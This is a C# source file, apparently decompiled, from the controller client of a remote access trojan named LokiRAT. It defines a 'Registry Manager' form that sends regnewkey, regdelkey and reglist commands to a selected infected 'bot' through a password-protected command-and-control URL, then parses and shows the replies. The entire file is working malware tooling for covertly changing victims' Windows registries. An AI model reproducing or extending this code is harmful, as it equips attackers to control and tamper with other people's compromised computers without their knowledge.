namespace LokiRAT_Client
{
    using LokiRAT_Server;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Net;
    using System.Text.RegularExpressions;
    using System.Windows.Forms;

    public class registry : Form
    {
        private WebClient client = new WebClient();
        private ColumnHeader columnHeader1;
        private ColumnHeader columnHeader2;
        private IContainer components = null;
        private ContextMenuStrip contextMenuStrip1;
        private ToolStripMenuItem creatRegistryKeyToolStripMenuItem;
        private ToolStripMenuItem deleteToolStripMenuItem;
        private ToolStripMenuItem editToolStripMenuItem;
        private string firstValue;
        public static string fullpath;
        private ImageList imageList1;
        public static string[,] keys = new string[0x3e7, 5];
        private ListView listView1;
        private string myLastCommand = "-1";
        private ToolStripMenuItem newToolStripMenuItem;
        private ToolStripMenuItem refreshToolStripMenuItem;
        private ToolStripMenuItem registryKeyToolStripMenuItem;
        public static int selectedKey;
        private ToolStripMenuItem stringValueToolStripMenuItem;
        private System.Windows.Forms.Timer timer1;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripTextBox toolStripTextBox1;
        private TreeView treeView1;

        public registry()
        {
            this.InitializeComponent();
        }

        private void creatRegistryKeyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=regnewkey|" + fullpath + this.toolStripTextBox1.Text + "|{-fol}|");
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=regdelkey|" + fullpath + "|" + keys[this.listView1.SelectedIndices[0], 0] + "|{-fol}");
            this.listView1.Items.Clear();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new registryEditKey().ShowDialog();
        }

        private void InitializeComponent()
        {
            this.components = new Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(registry));
            this.treeView1 = new TreeView();
            this.imageList1 = new ImageList(this.components);
            this.listView1 = new ListView();
            this.columnHeader1 = new ColumnHeader();
            this.columnHeader2 = new ColumnHeader();
            this.contextMenuStrip1 = new ContextMenuStrip(this.components);
            this.newToolStripMenuItem = new ToolStripMenuItem();
            this.registryKeyToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripTextBox1 = new ToolStripTextBox();
            this.creatRegistryKeyToolStripMenuItem = new ToolStripMenuItem();
            this.stringValueToolStripMenuItem = new ToolStripMenuItem();
            this.editToolStripMenuItem = new ToolStripMenuItem();
            this.deleteToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator1 = new ToolStripSeparator();
            this.refreshToolStripMenuItem = new ToolStripMenuItem();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip1.SuspendLayout();
            base.SuspendLayout();
            this.treeView1.Anchor = AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.treeView1.ImageIndex = 0;
            this.treeView1.ImageList = this.imageList1;
            this.treeView1.Location = new Point(2, 0);
            this.treeView1.Name = "treeView1";
            this.treeView1.SelectedImageIndex = 0;
            this.treeView1.Size = new Size(0xe2, 0x17b);
            this.treeView1.TabIndex = 0;
            this.treeView1.AfterSelect += new TreeViewEventHandler(this.treeView1_AfterSelect);
            this.imageList1.ImageStream = (ImageListStreamer) manager.GetObject("imageList1.ImageStream");
            this.imageList1.TransparentColor = Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "folder.png");
            this.imageList1.Images.SetKeyName(1, "330056.png");
            this.listView1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.listView1.Columns.AddRange(new ColumnHeader[] { this.columnHeader1, this.columnHeader2 });
            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new Point(0xea, 0);
            this.listView1.MultiSelect = false;
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.Size = new Size(0x1f6, 0x17b);
            this.listView1.SmallImageList = this.imageList1;
            this.listView1.TabIndex = 0x11;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = View.Details;
            this.listView1.SelectedIndexChanged += new EventHandler(this.listView1_SelectedIndexChanged);
            this.columnHeader1.Text = "Key Name";
            this.columnHeader1.Width = 0xab;
            this.columnHeader2.Text = "Key Value";
            this.columnHeader2.Width = 310;
            this.contextMenuStrip1.Items.AddRange(new ToolStripItem[] { this.newToolStripMenuItem, this.editToolStripMenuItem, this.deleteToolStripMenuItem, this.toolStripSeparator1, this.refreshToolStripMenuItem });
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new Size(0x7f, 0x62);
            this.newToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.registryKeyToolStripMenuItem, this.stringValueToolStripMenuItem });
            this.newToolStripMenuItem.Image = (Image) manager.GetObject("newToolStripMenuItem.Image");
            this.newToolStripMenuItem.Name = "newToolStripMenuItem";
            this.newToolStripMenuItem.Size = new Size(0x7e, 0x16);
            this.newToolStripMenuItem.Text = "New";
            this.registryKeyToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { this.toolStripTextBox1, this.creatRegistryKeyToolStripMenuItem });
            this.registryKeyToolStripMenuItem.Image = (Image) manager.GetObject("registryKeyToolStripMenuItem.Image");
            this.registryKeyToolStripMenuItem.Name = "registryKeyToolStripMenuItem";
            this.registryKeyToolStripMenuItem.Size = new Size(0x8a, 0x16);
            this.registryKeyToolStripMenuItem.Text = "Registry Key";
            this.toolStripTextBox1.Name = "toolStripTextBox1";
            this.toolStripTextBox1.Size = new Size(100, 0x17);
            this.creatRegistryKeyToolStripMenuItem.Image = (Image) manager.GetObject("creatRegistryKeyToolStripMenuItem.Image");
            this.creatRegistryKeyToolStripMenuItem.Name = "creatRegistryKeyToolStripMenuItem";
            this.creatRegistryKeyToolStripMenuItem.Size = new Size(0xa9, 0x16);
            this.creatRegistryKeyToolStripMenuItem.Text = "Creat Registry Key";
            this.creatRegistryKeyToolStripMenuItem.Click += new EventHandler(this.creatRegistryKeyToolStripMenuItem_Click);
            this.stringValueToolStripMenuItem.Image = (Image) manager.GetObject("stringValueToolStripMenuItem.Image");
            this.stringValueToolStripMenuItem.Name = "stringValueToolStripMenuItem";
            this.stringValueToolStripMenuItem.Size = new Size(0x8a, 0x16);
            this.stringValueToolStripMenuItem.Text = "String Value";
            this.stringValueToolStripMenuItem.Click += new EventHandler(this.stringValueToolStripMenuItem_Click);
            this.editToolStripMenuItem.Image = (Image) manager.GetObject("editToolStripMenuItem.Image");
            this.editToolStripMenuItem.Name = "editToolStripMenuItem";
            this.editToolStripMenuItem.Size = new Size(0x7e, 0x16);
            this.editToolStripMenuItem.Text = "Edit Value";
            this.editToolStripMenuItem.Click += new EventHandler(this.editToolStripMenuItem_Click);
            this.deleteToolStripMenuItem.Image = (Image) manager.GetObject("deleteToolStripMenuItem.Image");
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new Size(0x7e, 0x16);
            this.deleteToolStripMenuItem.Text = "Delete";
            this.deleteToolStripMenuItem.Click += new EventHandler(this.deleteToolStripMenuItem_Click);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new Size(0x7b, 6);
            this.refreshToolStripMenuItem.Image = (Image) manager.GetObject("refreshToolStripMenuItem.Image");
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new Size(0x7e, 0x16);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new EventHandler(this.refreshToolStripMenuItem_Click);
            this.timer1.Enabled = true;
            this.timer1.Interval = 500;
            this.timer1.Tick += new EventHandler(this.timer1_Tick);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x2de, 380);
            base.Controls.Add(this.listView1);
            base.Controls.Add(this.treeView1);
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            base.Name = "registry";
            this.Text = "Registry Manager | LokiRAT ";
            base.Load += new EventHandler(this.registry_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            base.ResumeLayout(false);
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                selectedKey = this.listView1.SelectedIndices[0];
            }
            catch
            {
            }
        }

        public string loadPage(string toHost)
        {
            string str = null;
            try
            {
                this.client.Headers["User-Agent"] = main.userAgent;
                str = this.client.DownloadString(main.connectionURL + "?pass=" + main.connectionPass + "&id=" + main.currentID + "&" + toHost);
            }
            catch
            {
                new configuration().ShowDialog();
            }
            return str;
        }

        public TreeNode makeNode(string text)
        {
            return new TreeNode(text);
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=reglist|" + fullpath);
        }

        private void registry_Load(object sender, EventArgs e)
        {
            this.treeView1.Nodes.Add("HKEY_CURRENT_USER");
        }

        private void stringValueToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new registryNewKey().ShowDialog();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string[] strArray = new string[5];
            string[] strArray2 = new string[1];
            string[] strArray3 = new string[0x3e7];
            string[] strArray4 = new string[0x3e7];
            try
            {
                if (main.lastCommand[main.selectedBot] != this.myLastCommand)
                {
                    this.myLastCommand = main.lastCommand[main.selectedBot];
                    if (main.lastCommandText[main.selectedBot].Substring(0, 9) == "LSreglist")
                    {
                        int num;
                        this.myLastCommand = main.lastCommand[main.selectedBot];
                        this.treeView1.SelectedNode.Nodes.Clear();
                        strArray2 = Regex.Split(main.lastCommandText[main.selectedBot], "{-lf}");
                        strArray4 = Regex.Split(strArray2[0], "{-l}");
                        strArray3 = Regex.Split(strArray2[1], "{-l}");
                        for (num = 1; num < (strArray4.Length - 1); num++)
                        {
                            this.treeView1.SelectedNode.Nodes.Add(this.makeNode(strArray4[num]));
                        }
                        this.listView1.Items.Clear();
                        for (num = 0; num < (strArray3.Length - 1); num++)
                        {
                            strArray = Regex.Split(strArray3[num], "{-li}");
                            ListViewItem item = this.listView1.Items.Add(strArray[0]);
                            keys[num, 0] = strArray[0];
                            keys[num, 1] = strArray[1];
                            item.ImageIndex = 1;
                            item.SubItems.Add(strArray[1]);
                        }
                    }
                    else if (main.lastCommandText[main.selectedBot].Substring(1, 10) == "Sregdelkey")
                    {
                        main.sendToHost("type=command&command=reglist|" + fullpath);
                    }
                    else if (main.lastCommandText[main.selectedBot].Substring(1, 10) == "Sregnewkey")
                    {
                        main.sendToHost("type=command&command=reglist|" + fullpath);
                    }
                }
            }
            catch
            {
            }
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            fullpath = this.treeView1.SelectedNode.FullPath.Replace(@"\", "//") + "//";
            this.firstValue = fullpath.Substring(0, fullpath.IndexOf("//"));
            fullpath = fullpath.Substring(this.firstValue.Length + 2, (fullpath.Length - this.firstValue.Length) - 2);
            this.listView1.Items.Clear();
            main.sendToHost("type=command&command=reglist|" + fullpath);
            this.timer1.Start();
        }
    }
}

